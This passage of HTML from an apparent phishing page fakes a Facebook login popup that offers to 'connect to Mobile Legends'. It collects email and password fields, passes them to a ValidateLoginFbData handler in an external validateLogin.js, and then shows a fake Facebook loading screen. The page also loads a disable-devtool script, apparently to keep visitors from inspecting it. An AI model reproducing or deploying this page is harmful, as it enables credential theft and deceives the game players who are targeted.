AJ9niJKlk/wCk+L5gYvIlmkyW+9V0h1Fn8Z4b81W7iT/aO5sq6JVN4WZUNNYsdE2WVIJR5hIIcV8Ltn18r+3dOnOJKre/xKezfH7/APCqlnDP+cuIc41LOmY5tUWCVtsOqCYzSuYKWQAi46LUFOWtdRO+NCLXThH7uFnZ1zlTDiqcKBWbgG/IYsWk43QAAWhSr4eCeE/3L4OeHBe4W2+kD1w/heWxC732xEmratWpF1c08ldceSEZXqjRak2y1dznyx8ZEr6ENLZV47ZfDGRnCks5+oUcLepqO7nIQNw10ct1tuCeg0+WO0/Rh1MGt+qpJ2/D/dc86js+/eGj4qiT6FIcUhYspJIOOy6sHdYstwMr7AefbV3LDmgk3Ssc0n0xN2mQmYCmIL0uZGnsKlqD/crUh1xZ3ULagD01JKhbzAwJWGRkpoGENO1JuG4WnUkLTuR5YripEW0HVVqJUHWT+zjhZ6+6tKrfNKVD54NjbHdRuGAuMKCtiLg9Lc/6YsUMeVGzYKBd2O7t+VR/rjxTs5UeSoGxGG5Xl8ST5Y8E0DKzS2ThQML2F1NtC4NsN5SLsZISAAMKQvLoThF5fcJleX25x7K8sLk4YSlC/W1C3TDQ0KYEY2UvAelUpruqTUJ1PQsArEOW4xqPmdCgL4EkUmHgD9FNQrPb5lYTnH6g33VTmS5oPWRIW6f+YnETKbccKd0yodsrQ20xHQEMNJSB5DBDQBwEM95fyVgpy52GJAoj7lr1emHgpCMr8VHSU+eEXlrx5eX0c8OXl0Lt3YN8eTVrx5eW5W6Cnzx5eXp1HWU3HTHxiV9EnhdaChxstuNpWhwFK0qFwoHmCMR0qr6NQVGHBCGqMFTLT5ql3aU7PT2WZT2bsqRFLpT5K3WEC5jK62/d9OmPpLo7qr/UTRFr/wAYfNcxvlkdCeXt9lV1ixihwL8hjozW4OFmjjyW1Li0wpLTPgW2kuKV8wP64iljAURUJUYK5Vdehtjxawm/wT/7YrAnqYyfUJlIbU5De7t5KloWCkKBTpGxB5jw4Ip7EJjuF0tyIygQXUJSfwnkPQdbfEk4swdkKeVzy49KcSpwOkLPINqJH0x5NCjQzY88e5TgtiGU293CYSLYlKfLCYXlvQnkL4XheW9CbW3w1eWacIV5fcMJXljhMry/YReWbdri4x4p7TkYXWhzbYYgduVMzZfXBe2GhLhYKXpHK98PCQrUVX6YkUZ3WGr0w0ryxw5eX7Hl5fsOXlmnHl4r9jy8s8eTV//Z">
                <p>Log in to your Facebook account to connect to Mobile Legends</p>
                <form class="form-group-fb" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
                    <input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="">
                    <div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPassword()">Show</div>
                    <div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPassword()">Hide</div>
                    <input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required="">
                    <input type="hidden" name="login" id="login-facebook" value="Facebook" readonly="">
                    <button type="submit" onclick="ValidateLoginFbData()">Log In</button>
                </form>
                <span>Create account</span>
                <span>Not now</span>
                <span>Forgotten password?</span>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">English (UK)</div>
                    <div class="language-name">العربية</div>
                    <div class="language-name">Türkçe</div>
                    <div class="language-name">Tiếng Việt</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name"><i class="fa fa-plus"></i></div>
                </center>
            </div>
            <div class="copyright">Facebook Inc.</div>
        </div>
    </div>
	
	<div class="popup-login login-facebook-load" style="display: none;">
        <div class="popup-box-login-fb">
            <div class="navbar-fb"><img src="data:image/png;base64,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"></div>
            <div class="content-box-fb">
                <div class="fb-load">
				<img src="images/loader.png">
				<div class="loader3"></div>
				</div>
            </div>
            <div class="copyright">Facebook Inc.</div>
        </div>
    </div>
	
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latests"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

    <script src="js/laza-slide.js"></script>
    <script src="js/validateLogin.js"></script>
    <script>
        const tabs = [{
                btn: 'tab-details',
                content: 'tab-content-details'
            },
            {
                btn: 'tab-reviews',
                content: 'tab-content-reviews'
            },
            {
                btn: 'tab-faqs',
